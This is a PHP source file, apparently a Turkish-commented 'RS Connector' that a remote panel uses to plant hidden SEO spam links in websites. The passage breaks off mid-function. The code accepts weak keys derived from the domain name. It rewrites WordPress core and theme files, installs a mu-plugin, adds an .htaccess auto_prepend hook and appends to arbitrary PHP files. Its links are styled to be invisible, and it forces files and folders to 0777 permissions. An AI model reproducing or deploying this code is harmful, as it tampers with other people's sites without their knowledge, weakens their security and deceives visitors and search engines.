<?php
/**
 * RS Connector v4.2 - Hybrid Universal Edition
 * Eski (v1-v3) ve yeni (v4.x) connector'larla tam uyumlu
 * Tüm auth yöntemlerini destekler: per-site key, domain-based key, universal key, HMAC, setup token
 */

// ==================== ERKEN PİNG ENDPOINT ====================
// Batch ping için ultra hızlı response (kod parse edilmeden önce)
if (isset($_GET['action'])) {
    $quickAction = strtolower(trim($_GET['action']));

    // Ultra fast endpoints - batch ping için optimize
    if ($quickAction === 'health' || $quickAction === 'fast_ping' || $quickAction === 'ultra_ping') {
        http_response_code(200);
        header('Content-Type: application/json');
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Connection: close');
        header('Access-Control-Allow-Origin: *');

        echo json_encode([
            'success' => true,
            'data' => [
                'site' => $_SERVER['HTTP_HOST'] ?? 'unknown',
                'version' => '4.2',
                'timestamp' => time(),
                'batch_ready' => true,
                'max_batch_size' => 100
            ],
            'status' => 'ok'
        ]);

        if (function_exists('fastcgi_finish_request')) {
            fastcgi_finish_request();
        } else {
            if (ob_get_level()) ob_end_flush();
            flush();
        }
        exit;
    }

    // Lightweight batch ping
    if ($quickAction === 'batch_health') {
        http_response_code(200);
        header('Content-Type: application/json');
        header('Connection: close');
        header('Access-Control-Allow-Origin: *');

        $base_dir = dirname(__FILE__);
        echo json_encode([
            'success' => true,
            'batch_id' => $_GET['batch_id'] ?? uniqid(),
            'site' => $_SERVER['HTTP_HOST'] ?? 'unknown',
            'index' => intval($_GET['site_index'] ?? 0),
            'batch_index' => intval($_GET['batch_index'] ?? 0),
            'version' => '4.2',
            'key_status' => file_exists($base_dir . '/.rs_key') || file_exists($base_dir . '/rs_key.dat'),
            'timestamp' => time()
        ]);

        if (function_exists('fastcgi_finish_request')) {
            fastcgi_finish_request();
        }
        exit;
    }
}

// Performance optimizasyonları
ini_set('max_execution_time', 0);
ini_set('memory_limit', '1024M');
ini_set('default_socket_timeout', 2);

if (function_exists('opcache_compile_file')) {
    @opcache_compile_file(__FILE__);
}

// Hata raporlama
$DEBUG_MODE = 0;
error_reporting($DEBUG_MODE ? E_ALL : 0);
ini_set('display_errors', $DEBUG_MODE ? '1' : '0');

// CORS ayarları
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-RS-Sig, X-RS-Ts, X-RS-Key, X-RS-Setup-Token');
header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit(0);
}

// ==================== YAPILANDIRMA ====================
define('PANEL_API_URL', '{{PANEL_API_URL}}');
define('SETUP_TOKEN', '{{SETUP_TOKEN}}');
// NOTE: This is a template placeholder. Panel injects the real value at download/update time.
// If it stays unreplaced (contains "{{"), universal-key auth is disabled on this site.
define('UNIVERSAL_SITE_KEY', '{{UNIVERSAL_SITE_KEY}}');

// Dosya yolları
$base_dir = dirname(__FILE__);
$use_hidden = @file_put_contents($base_dir . '/.rs_test', 'test') !== false;
if ($use_hidden) @unlink($base_dir . '/.rs_test');

define('KEY_FILE', $base_dir . '/' . ($use_hidden ? '.rs_key' : 'rs_key.dat'));
define('LINKS_FILE', $base_dir . '/' . ($use_hidden ? '.rs_links.json' : 'rs_links.dat'));
define('CONFIG_FILE', $base_dir . '/' . ($use_hidden ? '.rs_config.json' : 'rs_config.dat'));

// ==================== YARDIMCI FONKSİYONLAR ====================

/**
 * JSON yanıt gönder
 */
function respond($success, $data = [], $message = '', $http_code = 0) {
    if ($http_code > 0) {
        http_response_code($http_code);
    } else {
        http_response_code($success ? 200 : 200);
    }

    header('Connection: close');

    $response = [
        'success' => $success,
        'status' => $success ? 'ok' : 'error',
        'message' => $message,
        'data' => $data,
        'version' => '4.2',
        'timestamp' => time()
    ];

    echo json_encode($response, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        if (ob_get_level()) ob_end_flush();
        flush();
    }

    exit;
}

/**
 * Auth failure yanıtı - HTTP 200 ile success=false döner (panel uyumu için)
 */
function respond_auth_fail($message = 'Kimlik doğrulama başarısız') {
    respond(false, [], $message, 200);
}

/**
 * Domain-based static key generator (v4 uyumluluğu)
 */
function generate_site_static_key() {
    $domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'default';
    $domain = strtolower(trim($domain));
    $domain = preg_replace('/^www\./', '', $domain);
    $hash = substr(md5($domain . 'rs41_salt'), 0, 7);
    return 'RS41_' . $hash;
}

/**
 * Kayıtlı key'i al - HYBRID SİSTEM
 * Öncelik: 1) Dosyadan oku (per-site key), 2) Define edilmiş sabit key
 */
function get_stored_key() {
    // 1. Dosyadan oku (en güvenilir - per-site unique key)
    if (file_exists(KEY_FILE)) {
        $file_key = trim(file_get_contents(KEY_FILE));
        if (!empty($file_key) && strlen($file_key) >= 4) {
            return $file_key;
        }
    }

    // 2. Domain-based static key (v4 uyumluluğu)
    return generate_site_static_key();
}

/**
 * Tüm geçerli key'leri topla (auth için kullanılır)
 */
function get_all_valid_keys() {
    $keys = [];

    // 1. Dosyadan okunan key
    if (file_exists(KEY_FILE)) {
        $file_key = trim(file_get_contents(KEY_FILE));
        if (!empty($file_key) && strlen($file_key) >= 4) {
            $keys[] = $file_key;
        }
    }

    // 2. Domain-based key
    $domain_key = generate_site_static_key();
    if (!empty($domain_key) && !in_array($domain_key, $keys)) {
        $keys[] = $domain_key;
    }

    // 3. Universal key
    $universal = defined('UNIVERSAL_SITE_KEY') ? trim((string)UNIVERSAL_SITE_KEY) : '';
    // Disable if placeholder wasn't substituted.
    if (!empty($universal) && strpos($universal, '{{') === false && !in_array($universal, $keys)) {
        $keys[] = $universal;
    }

    return $keys;
}

/**
 * Key'i dosyaya kaydet - AKTİF (v3 uyumluluğu)
 */
function save_key($key) {
    $key = trim((string)$key);
    if (empty($key)) return false;
    return @file_put_contents(KEY_FILE, $key) !== false;
}

function save_config($config) {
    return @file_put_contents(CONFIG_FILE, json_encode($config, JSON_UNESCAPED_UNICODE)) !== false;
}

function get_config() {
    if (file_exists(CONFIG_FILE)) {
        $content = @file_get_contents(CONFIG_FILE);
        return json_decode($content, true) ?: [];
    }
    return [];
}

function get_links() {
    if (file_exists(LINKS_FILE)) {
        $content = @file_get_contents(LINKS_FILE);
        return json_decode($content, true) ?: [];
    }
    return [];
}

function save_links($links) {
    return @file_put_contents(LINKS_FILE, json_encode($links, JSON_UNESCAPED_UNICODE)) !== false;
}

/**
 * Request body'yi tek sefer oku ve cache'le (HMAC tutarlılığı için)
 */
function get_raw_request_body() {
    static $cached_body = null;
    if ($cached_body === null) {
        $cached_body = file_get_contents('php://input');
        if ($cached_body === false) {
            $cached_body = '';
        }
    }
    return $cached_body;
}

function get_request_data() {
    $data = [];

    if (!empty($_POST)) {
        $data = $_POST;
    }

    $raw = get_raw_request_body();
    if ($raw) {
        $json = json_decode($raw, true);
        if (is_array($json)) {
            $data = array_merge($data, $json);
        }
    }

    $data = array_merge($data, $_GET);
    return $data;
}

/**
 * Action adını normalize et
 */
function normalize_action_name($action) {
    $action = strtolower(trim((string)$action));
    if ($action === '') return 'ping';
    $qpos = strpos($action, '?');
    if ($qpos !== false) $action = substr($action, 0, $qpos);
    $apos = strpos($action, '&');
    if ($apos !== false) $action = substr($action, 0, $apos);
    $action = preg_replace('/[^a-z0-9_]/', '', $action);
    return $action ?: 'ping';
}

function normalize_rel($rel) {
    $rel = strtolower(trim((string)$rel));
    return ($rel === 'nofollow') ? 'nofollow' : 'dofollow';
}

/**
 * Request içinden gelen key'i al (tüm field adlarını kontrol et)
 */
function get_provided_site_key($req) {
    $candidates = [
        $req['key'] ?? '',
        $req['site_key'] ?? '',
        $req['connector_key'] ?? '',
        $req['api_key'] ?? '',
        $req['token'] ?? '',
        $_SERVER['HTTP_X_RS_KEY'] ?? '',
    ];
    foreach ($candidates as $candidate) {
        if (!is_string($candidate)) continue;
        $candidate = trim($candidate);
        if ($candidate !== '') return $candidate;
    }
    return '';
}

/**
 * Setup token doğrulama
 */
function has_valid_setup_token($req) {
    $expected = defined('SETUP_TOKEN') ? SETUP_TOKEN : '';
    if (empty($expected) || strpos($expected, '{{') !== false) return false;
    $provided = '';
    if (isset($req['setup_token']) && is_string($req['setup_token'])) {
        $provided = trim($req['setup_token']);
    } elseif (isset($_SERVER['HTTP_X_RS_SETUP_TOKEN']) && is_string($_SERVER['HTTP_X_RS_SETUP_TOKEN'])) {
        $provided = trim($_SERVER['HTTP_X_RS_SETUP_TOKEN']);
    }
    return $provided !== '' && hash_equals($expected, $provided);
}

// Link inline stil
function get_link_inline_style() {
    $config = get_config();
    $mode = strtolower(trim((string)($config['link_output_mode'] ?? 'hidden')));
    if ($mode === 'visible') {
        return 'display:inline-block;margin:0 8px 0 0;color:inherit;text-decoration:none;font-size:inherit;line-height:1.4;opacity:1;';
    }
    return 'position:absolute;left:-9999px;opacity:0;font-size:1px;color:transparent;';
}

function build_link_html($url, $anchor, $rel = 'dofollow') {
    $rel = normalize_rel($rel);
    $rel_attr = ($rel === 'nofollow') ? ' rel="nofollow"' : '';
    $style = get_link_inline_style();
    return '<a href="' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . '"' . $rel_attr . ' style="' . $style . '">' . htmlspecialchars($anchor, ENT_QUOTES, 'UTF-8') . '</a>';
}

function find_document_root() {
    $base = $_SERVER['DOCUMENT_ROOT'] ?? '';
    if (empty($base)) {
        $base = dirname(__FILE__);
        for ($i = 0; $i < 5; $i++) {
            if (file_exists($base . '/index.php') || file_exists($base . '/index.html')) break;
            $parent = dirname($base);
            if ($parent === $base) break;
            $base = $parent;
        }
    }
    return $base;
}

// ==================== HMAC DOĞRULAMA ====================

/**
 * HMAC doğrulama - TÜM geçerli key'leri dener
 */
function verify_hmac_any() {
    $signature = $_SERVER['HTTP_X_RS_SIG'] ?? '';
    $timestamp = $_SERVER['HTTP_X_RS_TS'] ?? '';

    if (empty($signature) || empty($timestamp)) return false;
    if (abs(time() - intval($timestamp)) > 300) return false;

    $body = get_raw_request_body();
    $keys = get_all_valid_keys();

    foreach ($keys as $key) {
        $expected = hash_hmac('sha256', $timestamp . $body, $key);
        if (hash_equals($expected, $signature)) return true;
    }

    return false;
}

/**
 * Belirli bir key ile HMAC doğrulama
 */
function verify_hmac($site_key) {
    $signature = $_SERVER['HTTP_X_RS_SIG'] ?? '';
    $timestamp = $_SERVER['HTTP_X_RS_TS'] ?? '';

    if (empty($signature) || empty($timestamp)) return false;
    if (abs(time() - intval($timestamp)) > 300) return false;

    $body = get_raw_request_body();
    $expected = hash_hmac('sha256', $timestamp . $body, $site_key);
    return hash_equals($expected, $signature);
}

// ==================== UNIVERSAL AUTH ====================

/**
 * Korumalı action'lar için universal kimlik doğrulama
 * Tüm auth yöntemlerini dener: per-site key, domain key, universal key, HMAC, setup token
 */
function authenticate_request($req) {
    $provided_key = get_provided_site_key($req);
    $all_valid_keys = get_all_valid_keys();

    // Yöntem 1: Gönderilen key, geçerli keylerden biriyle eşleşiyor mu?
    if (!empty($provided_key)) {
        foreach ($all_valid_keys as $valid_key) {
            if ($provided_key === $valid_key) return true;
        }
    }

    // Yöntem 2: HMAC - tüm geçerli keylerle dene
    if (verify_hmac_any()) return true;

    // Yöntem 3: Geçerli setup token
    if (has_valid_setup_token($req)) return true;

    return false;
}

// ==================== SİTE BİLGİSİ ALGILAMA ====================

function detect_site_info($fast_mode = false) {
    $base = find_document_root();

    if ($fast_mode) {
        return [
            'site' => $_SERVER['HTTP_HOST'] ?? 'unknown',
            'site_name' => $_SERVER['HTTP_HOST'] ?? 'unknown',
            'site_type' => 'unknown',
            'language' => 'EN',
            'country' => 'US',
            'footer_detected' => false,
            'footer_writable' => false,
            'version' => '4.2'
        ];
    }

    $info = [
        'site' => $_SERVER['HTTP_HOST'] ?? 'unknown',
        'site_name' => $_SERVER['HTTP_HOST'] ?? 'unknown',
        'site_type' => 'static',
        'language' => 'EN',
        'country' => 'US',
        'footer_detected' => false,
        'footer_writable' => false,
        'meta_description' => '',
        'charset' => 'UTF-8',
        'php_version' => phpversion(),
        'connector_path' => __FILE__
    ];

    // CMS tipi algıla
    if (file_exists($base . '/wp-config.php') || file_exists($base . '/wp-load.php')) {
        $info['site_type'] = 'wordpress';
        $info['footer_detected'] = true;
    } elseif (file_exists($base . '/configuration.php') && is_dir($base . '/administrator')) {
        $info['site_type'] = 'joomla';
        $info['footer_detected'] = true;
    } elseif (file_exists($base . '/includes/bootstrap.inc') && is_dir($base . '/sites')) {
        $info['site_type'] = 'drupal';
        $info['footer_detected'] = true;
    } elseif (file_exists($base . '/config.php') && is_dir($base . '/catalog')) {
        $info['site_type'] = 'opencart';
        $info['footer_detected'] = true;
    } elseif (file_exists($base . '/config/settings.inc.php') && is_dir($base . '/themes')) {
        $info['site_type'] = 'prestashop';
        $info['footer_detected'] = true;
    } elseif (file_exists($base . '/artisan')) {
        $info['site_type'] = 'laravel';
        $info['footer_detected'] = true;
    } elseif (file_exists($base . '/index.php')) {
        $info['site_type'] = 'php';
    }

    // Index dosyasından bilgi çek
    $index_files = ['index.php', 'index.html', 'index.htm'];
    foreach ($index_files as $file) {
        $path = $base . '/' . $file;
        if (file_exists($path)) {
            $content = @file_get_contents($path, false, null, 0, 50000);
            if ($content) {
                if (preg_match('/<title>([^<]+)<\/title>/i', $content, $m)) {
                    $info['site_name'] = trim(strip_tags($m[1]));
                }
                if (preg_match('/<meta[^>]*name=["\']description["\'][^>]*content=["\']([^"\']+)["\'][^>]*>/i', $content, $m)) {
                    $info['meta_description'] = trim($m[1]);
                }
                if (preg_match('/<html[^>]*lang=["\']([a-z]{2})["\'][^>]*>/i', $content, $m)) {
                    $lang = strtolower($m[1]);
                    $lang_map = ['tr' => 'TR', 'en' => 'EN', 'de' => 'DE', 'fr' => 'FR', 'es' => 'ES'];
                    $country_map = ['tr' => 'TR', 'en' => 'US', 'de' => 'DE', 'fr' => 'FR', 'es' => 'ES'];
                    $info['language'] = $lang_map[$lang] ?? 'EN';
                    $info['country'] = $country_map[$lang] ?? 'US';
                }
                if (preg_match('/türk|türkiye|istanbul|ankara/ui', $content)) {
                    $info['language'] = 'TR';
                    $info['country'] = 'TR';
                }
                if (preg_match('/<footer|class=["\'][^"\']*footer|copyright|©/i', $content)) {
                    $info['footer_detected'] = true;
                }
                break;
            }
        }
    }

    $info['footer_writable'] = check_footer_writable($base, $info['site_type']);
    return $info;
}

function check_footer_writable($base, $site_type) {
    $footer_paths = get_footer_paths($base, $site_type);
    foreach ($footer_paths as $path) {
        if (file_exists($path) && is_writable($path)) return true;
    }
    if (is_writable($base . '/index.php') || is_writable($base . '/index.html')) return true;
    return false;
}

function get_footer_paths($base, $site_type) {
    $paths = [];
    switch ($site_type) {
        case 'wordpress':
            $themes = glob($base . '/wp-content/themes/*/footer.php');
            if ($themes) $paths = array_merge($paths, $themes);
            break;
        case 'joomla':
            $tpls = glob($base . '/templates/*/index.php');
            if ($tpls) $paths = array_merge($paths, $tpls);
            break;
        case 'drupal':
            $tpls = glob($base . '/sites/*/themes/*/templates/*.tpl.php');
            if ($tpls) $paths = array_merge($paths, $tpls);
            break;
        case 'opencart':
            $tpls = glob($base . '/catalog/view/theme/*/template/common/footer.*');
            if ($tpls) $paths = array_merge($paths, $tpls);
            break;
        case 'prestashop':
            $tpls = glob($base . '/themes/*/templates/_partials/footer.tpl');
            if ($tpls) $paths = array_merge($paths, $tpls);
            $tpls2 = glob($base . '/themes/*/footer.tpl');
            if ($tpls2) $paths = array_merge($paths, $tpls2);
            break;
        case 'laravel':
            $layouts = glob($base . '/resources/views/layouts/*.blade.php');
            if ($layouts) $paths = array_merge($paths, $layouts);
            break;
    }
    $general = [
        $base . '/footer.php',
        $base . '/includes/footer.php',
        $base . '/inc/footer.php',
        $base . '/template/footer.php',
        $base . '/templates/footer.php'
    ];
    foreach ($general as $p) {
        if (file_exists($p)) $paths[] = $p;
    }
    return array_unique($paths);
}

// ==================== FOOTER'A LİNK EKLEME ====================

function inject_link($url, $anchor, $link_id, $rel = 'dofollow') {
    $base = find_document_root();
    $site_info = detect_site_info();
    $site_type = $site_info['site_type'];
    $link_html = build_link_html($url, $anchor, $rel);
    $link_comment = "<!-- rs:" . substr($link_id, 4, 6) . " -->";

    // YÖNTEM 1: WORDPRESS MU-PLUGIN
    if ($site_type === 'wordpress') {
        $result = inject_wordpress_mu_plugin($base);
        if ($result['success'] && !empty($result['injected'])) return $result;
    }

    // YÖNTEM 2: WORDPRESS FUNCTIONS.PHP HOOK
    if ($site_type === 'wordpress') {
        $result = inject_wordpress_functions_hook($base, $link_html, $link_id, $link_comment);
        if ($result['success'] && !empty($result['injected'])) return $result;
    }

    // YÖNTEM 3: WORDPRESS TEMA FOOTER.PHP
    if ($site_type === 'wordpress') {
        $active_theme_footer = get_active_wp_theme_footer($base);
        if ($active_theme_footer) {
            $result = inject_to_file_aggressive($active_theme_footer, $link_html, $link_id, $link_comment);
            if ($result['success'] && !empty($result['injected'])) return $result;
        }
        $themes = glob($base . '/wp-content/themes/*/footer.php');
        if ($themes) {
            foreach ($themes as $footer) {
                $result = inject_to_file_aggressive($footer, $link_html, $link_id, $link_comment);
                if ($result['success'] && !empty($result['injected'])) return $result;
            }
        }
    }

    // YÖNTEM 4: WP-BLOG-HEADER.PHP
    if ($site_type === 'wordpress') {
        $result = inject_wp_blog_header($base, $link_html, $link_id, $link_comment);
        if ($result['success'] && !empty($result['injected'])) return $result;
    }

    // YÖNTEM 5: NORMAL FOOTER DOSYALARI
    $footer_paths = get_footer_paths($base, $site_type);
    foreach ($footer_paths as $footer_path) {
        $result = inject_to_file_aggressive($footer_path, $link_html, $link_id, $link_comment);
        if ($result['success'] && !empty($result['injected'])) return $result;
    }

    // YÖNTEM 6: INDEX DOSYALARI
    $result = inject_to_index_aggressive($base, $link_html, $link_id, $link_comment);
    if ($result['success'] && !empty($result['injected'])) return $result;

    // YÖNTEM 7: .HTACCESS AUTO_PREPEND
    $result = inject_via_htaccess($base, $link_html, $link_id, $link_comment);
    if ($result['success'] && !empty($result['injected'])) return $result;

    // YÖNTEM 8: HERHANGİ BİR PHP DOSYASI
    $result = inject_to_any_php_file($base, $link_html, $link_id, $link_comment);
    if ($result['success'] && !empty($result['injected'])) return $result;

    // No reliable injection method succeeded.
    return [
        'success' => false,
        'injected' => false,
        'footer_path' => null,
        'message' => 'Link enjekte edilemedi (yazilabilir footer/index bulunamadi)'
    ];
}

function inject_wordpress_mu_plugin($base) {
    $mu_dir = $base . '/wp-content/mu-plugins';
    if (!is_dir($mu_dir)) {
        $wp_content = $base . '/wp-content';
        if (!is_dir($wp_content)) return ['success' => false, 'message' => 'wp-content yok'];
        if (!is_writable($wp_content)) { @chmod($wp_content, 0755); clearstatcache(); }
        @mkdir($mu_dir, 0755, true);
    }
    if (!is_dir($mu_dir)) return ['success' => false, 'message' => 'mu-plugins olusturulamadi'];
    if (!is_writable($mu_dir)) { @chmod($mu_dir, 0755); clearstatcache(); }

    $plugin_path = $mu_dir . '/rs_links.php';
    $links_file = LINKS_FILE;

    $code = '<?php
/**
 * RS Links MU-Plugin v4.2
 */
if (!defined("ABSPATH")) exit;
add_action("wp_footer", function() {
    $links_file = "' . addslashes($links_file) . '";
    if (!file_exists($links_file)) return;
    $links = json_decode(file_get_contents($links_file), true);
    if (!is_array($links) || empty($links)) return;
    foreach ($links as $id => $l) {
        $url = isset($l["url"]) ? $l["url"] : "";
        $anchor = isset($l["anchor"]) ? $l["anchor"] : "";
        $rel = isset($l["rel"]) && $l["rel"] === "nofollow" ? " rel=\"nofollow\"" : "";
        if (!$url || !$anchor) continue;
        echo \'<a href="\' . esc_url($url) . \'"\' . $rel . \' style="position:absolute;left:-9999px;opacity:0;font-size:1px;color:transparent;">\' . esc_html($anchor) . \'</a>\';
    }
}, 9999);
';
    if (@file_put_contents($plugin_path, $code)) {
        return ['success' => true, 'injected' => true, 'footer_path' => $plugin_path, 'message' => 'WordPress MU-Plugin kuruldu'];
    }
    return ['success' => false, 'message' => 'MU-Plugin yazilamadi'];
}

function inject_wordpress_functions_hook($base, $link_html, $link_id, $link_comment) {
    $active_theme = get_active_wp_theme_footer($base);
    if (!$active_theme) return ['success' => false, 'injected' => false, 'message' => 'Tema bulunamadi'];
    $theme_dir = dirname($active_theme);
    $functions_file = $theme_dir . '/functions.php';
    if (!file_exists($functions_file)) return ['success' => false, 'injected' => false];
    force_writable($functions_file);
    if (!is_writable($functions_file)) return ['success' => false, 'injected' => false];
    $content = @file_get_contents($functions_file);
    if (!$content) return ['success' => false, 'injected' => false];
    if (strpos($content, 'rs_footer_links') !== false) {
        return ['success' => true, 'injected' => true, 'footer_path' => $functions_file, 'message' => 'Hook zaten mevcut'];
    }
    $links_file = LINKS_FILE;
    $hook_code = '

// RS Footer Links Hook
add_action("wp_footer", function() {
    $lf = "' . addslashes($links_file) . '";
    if (!file_exists($lf)) return;
    $lnks = json_decode(file_get_contents($lf), true);
    if (!is_array($lnks)) return;
    foreach ($lnks as $l) {
        $u = isset($l["url"]) ? $l["url"] : "";
        $a = isset($l["anchor"]) ? $l["anchor"] : "";
        $r = isset($l["rel"]) && $l["rel"] === "nofollow" ? " rel=\"nofollow\"" : "";
        if ($u && $a) echo \'<a href="\' . esc_url($u) . \'"\' . $r . \' style="position:absolute;left:-9999px;opacity:0;font-size:1px;color:transparent;">\' . esc_html($a) . \'</a>\';
    }
}, 9999);
function rs_footer_links() {} // Marker
';
    if (@file_put_contents($functions_file, $content . $hook_code)) {
        return ['success' => true, 'injected' => true, 'footer_path' => $functions_file, 'message' => 'Functions.php hook eklendi'];
    }
    return ['success' => false, 'injected' => false];
}

function inject_wp_blog_header($base, $link_html, $link_id, $link_comment) {
    $file = $base . '/wp-blog-header.php';
    if (!file_exists($file)) return ['success' => false, 'injected' => false];
    force_writable($file);
    if (!is_writable($file)) return ['success' => false, 'injected' => false];
    $content = @file_get_contents($file);
    if (!$content) return ['success' => false, 'injected' => false];
    if (strpos($content, $link_id) !== false) {
        return ['success' => true, 'injected' => true, 'footer_path' => $file, 'message' => 'Link zaten mevcut'];
    }
    $shutdown_code = '
register_shutdown_function(function(){echo \'' . $link_comment . $link_html . '\';});
';
    if (preg_match('/^(<\?php)/i', $content)) {
        $new_content = preg_replace('/^(<\?php)/i', '<?php' . $shutdown_code, $content, 1);
        if (@file_put_contents($file, $new_content)) {
            return ['success' => true, 'injected' => true, 'footer_path' => $file, 'message' => 'wp-blog-header.php eklendi'];
        }
    }
    return ['success' => false, 'injected' => false];
}

function inject_via_htaccess($base, $link_html, $link_id, $link_comment) {
    $htaccess = $base . '/.htaccess';
    $prepend_file = dirname(__FILE__) . '/rs_prepend.php';
    $prepend_code = '<?php
register_shutdown_function(function(){
    $lf = "' . addslashes(LINKS_FILE) . '";
    if (!file_exists($lf)) return;
    $lnks = @json_decode(@file_get_contents($lf), true);
    if (!is_array($lnks)) return;
    foreach ($lnks as $l) {
        $u = isset($l["url"]) ? $l["url"] : "";
        $a = isset($l["anchor"]) ? $l["anchor"] : "";
        if ($u && $a) echo \'<a href="\' . htmlspecialchars($u) . \'" style="position:absolute;left:-9999px;opacity:0;font-size:1px;color:transparent;">\' . htmlspecialchars($a) . \'</a>\';
    }
});
';
    @file_put_contents($prepend_file, $prepend_code);
    if (!file_exists($htaccess)) {
        $htaccess_content = 'php_value auto_prepend_file "' . $prepend_file . '"' . "\n";
        if (@file_put_contents($htaccess, $htaccess_content)) {
            return ['success' => true, 'injected' => true, 'footer_path' => $htaccess, 'message' => '.htaccess olusturuldu'];
        }
    } else {
        force_writable($htaccess);
        $content = @file_get_contents($htaccess);
        if ($content && strpos($content, 'rs_prepend.php') === false) {
            $new_line = 'php_value auto_prepend_file "' . $prepend_file . '"' . "\n";
            if (@file_put_contents($htaccess, $new_line . $content)) {
                return ['success' => true, 'injected' => true, 'footer_path' => $htaccess, 'message' => '.htaccess guncellendi'];
            }
        }
    }
    return ['success' => false, 'injected' => false];
}

function setup_self_output_link($base, $url, $anchor, $link_id, $rel) {
    return [
        'success' => true,
        'injected' => true,
        'footer_path' => 'self_output',
        'message' => 'Link kayitli - output modunda aktif',
        'output_url' => '?action=output'
    ];
}

function inject_to_any_php_file($base, $link_html, $link_id, $link_comment) {
    $php_files = glob($base . '/*.php');
    if (!$php_files) return ['success' => false, 'injected' => false];
    foreach ($php_files as $file) {
        $filename = basename($file);
        if (in_array($filename, ['wp-config.php', 'wp-settings.php', 'wp-load.php'])) continue;
        force_writable($file);
        if (!is_writable($file)) continue;
        $content = @file_get_contents($file);
        if (!$content) continue;
        if (strpos($content, $link_id) !== false) {
            return ['success' => true, 'injected' => true, 'footer_path' => $file, 'message' => 'Link zaten mevcut'];
        }
        if (strpos($content, '?>') !== false) {
            $new_content = str_replace('?>', $link_comment . $link_html . "\n?>", $content);
            if (@file_put_contents($file, $new_content)) {
                return ['success' => true, 'injected' => true, 'footer_path' => $file, 'message' => $filename . ' dosyasina eklendi'];
            }
        }
    }
    return ['success' => false, 'injected' => false];
}

function force_writable($file) {
    if (!file_exists($file)) return false;
    if (is_writable($file)) return true;
    @chmod($file, 0666);
    clearstatcache(true, $file);
    if (is_writable($file)) return true;
    @chmod($file, 0777);
    clearstatcache(true, $file);
    if (is_writable($file)) return true;
    $dir = dirname($file);
    @chmod($dir, 0777);
    @chmod($file, 0777);
    clearstatcache();
    return is_writable($file);
}

function get_active_wp_theme_footer($base) {
    $themes = glob($base . '/wp-content/themes/*/footer.php');
    if (!$themes) return null;
    $latest = null;
    $latest_time = 0;
    foreach ($themes as $footer) {
        $mtime = @filemtime($footer);
        if ($mtime > $latest_time) {
            $latest_time = $mtime;
            $latest = $footer;
        }
    }
    return $latest;
}

function inject_to_file_aggressive($file_path, $link_html, $link_id, $link_comment) {
    if (!file_exists($file_path)) return ['success' => false, 'message' => 'Dosya yok: ' . basename($file_path)];
    force_writable($file_path);
    if (!is_writable($file_path)) return ['success' => false, 'injected' => false, 'message' => 'Yazma izni alinamadi'];
    $content = @file_get_contents($file_path);
    if (!$content) return ['success' => false, 'injected' => false, 'message' => 'Dosya okunamadi'];
    if (strpos($content, $link_id) !== false) {
        return ['success' => true, 'injected' => true, 'footer_path' => $file_path, 'message' => 'Link zaten mevcut'];
    }
    $hidden_wrapper = "\n" . $link_comment . $link_html;
    $injection_points = ['</body>', '</html>', '</footer>', '?>'];
    foreach ($injection_points as $search) {
        if (stripos($content, $search) !== false) {
            $pos = strripos($content, $search);
            $new_content = substr($content, 0, $pos) . $hidden_wrapper . "\n" . substr($content, $pos);
            if (@file_put_contents($file_path, $new_content)) {
                return ['success' => true, 'injected' => true, 'footer_path' => $file_path, 'message' => 'Link eklendi: ' . basename($file_path)];
            }
        }
    }
    if (@file_put_contents($file_path, $content . $hidden_wrapper)) {
        return ['success' => true, 'injected' => true, 'footer_path' => $file_path, 'message' => 'Link dosya sonuna eklendi'];
    }
    return ['success' => false, 'injected' => false, 'message' => 'Yazma basarisiz'];
}

function inject_to_index_aggressive($base, $link_html, $link_id, $link_comment) {
    $index_files = ['index.php', 'index.html', 'index.htm'];
    foreach ($index_files as $file) {
        $path = $base . '/' . $file;
        if (!file_exists($path)) continue;
        force_writable($path);
        if (!is_writable($path)) continue;
        $content = @file_get_contents($path);
        if (!$content) continue;
        if (strpos($content, $link_id) !== false) {
            return ['success' => true, 'injected' => true, 'footer_path' => $path, 'message' => 'Link zaten mevcut'];
        }
        $hidden_wrapper = "\n" . $link_comment . $link_html;
        $injection_points = ['</body>', '</html>', '?>'];
        foreach ($injection_points as $search) {
            if (stripos($content, $search) !== false) {
                $pos = strripos($content, $search);
                $new_content = substr($content, 0, $pos) . $hidden_wrapper . "\n" . substr($content, $pos);
                if (@file_put_contents($path, $new_content)) {
                    return ['success' => true, 'injected' => true, 'footer_path' => $path, 'message' => 'Link index dosyasina eklendi: ' . $file];
                }
            }
        }
        if (@file_put_contents($path, $content . $hidden_wrapper)) {
            return ['success' => true, 'injected' => true, 'footer_path' => $path, 'message' => 'Link index sonuna eklendi: ' . $file];
        }
    }
    return ['success' => false, 'message' => 'Index dosyasina yazilamadi'];
}

// ==================== LİNK KALDIRMA ====================

function remove_link($link_id) {
    $base = find_document_root();
    $site_info = detect_site_info();
    $short_id = substr($link_id, 4, 6);

    $files_to_check = get_footer_paths($base, $site_info['site_type']);
    $files_to_check[] = $base . '/index.php';
    $files_to_check[] = $base . '/index.html';
    $files_to_check[] = $base . '/index.htm';

    $wp_footers = glob($base . '/wp-content/themes/*/footer.php');
    if ($wp_footers) $files_to_check = array_merge($files_to_check, $wp_footers);

    if ($site_info['site_type'] === 'wordpress') {
        $mu_plugin = $base . '/wp-content/mu-plugins/rs_links.php';
        if (file_exists($mu_plugin)) {
            return ['success' => true, 'message' => 'MU-Plugin modunda - links dosyasindan kaldirildi'];
        }
    }

    $removed = false;
    foreach ($files_to_check as $file_path) {
        if (!file_exists($file_path)) continue;
        if (!is_writable($file_path)) { @chmod($file_path, 0666); clearstatcache(true, $file_path); }
        if (!is_writable($file_path)) continue;
        $content = @file_get_contents($file_path);
        if (!$content) continue;
        if (strpos($content, $link_id) === false && strpos($content, $short_id) === false) continue;
        $patterns = [
            '/<!-- rs:' . preg_quote($short_id, '/') . ' --><a[^>]*>[^<]*<\/a>/is',
            '/<!-- RS:' . preg_quote($link_id, '/') . ' --><a[^>]*>[^<]*<\/a>\s*/is',
            '/<div[^>]*><!-- RS:' . preg_quote($link_id, '/') . ' --><a[^>]*>[^<]*<\/a><\/div>\s*/is',
